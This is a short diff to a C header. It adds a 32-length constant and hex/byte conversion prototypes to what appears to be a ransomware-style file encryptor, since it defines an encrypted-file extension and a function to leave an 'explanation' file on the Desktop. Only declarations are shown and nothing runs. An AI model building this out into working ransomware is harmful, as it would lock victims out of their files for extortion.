@@ -7,6 +7,7 @@
 #define MAX 1000000 // 1Mb
 #define ENC_EXT ".st"
 #define LEN_ENC_EXT 3
+#define LENGTH 32
 
 enum {
 	EXIST,
@@ -50,3 +51,8 @@ char* addPath(const char* path, const char* file);
 // maybe write it in a file in the Desktop if possible
 // or somewhere to be easily findable
 void leaveExplanation();
+
+// string to hex array
+int bytes_to_hexa(const unsigned char bytes_string[], char *hex_string, int size);
+// hex array to string
+int hexa_to_bytes(char hex_string[], unsigned char val[], int size);
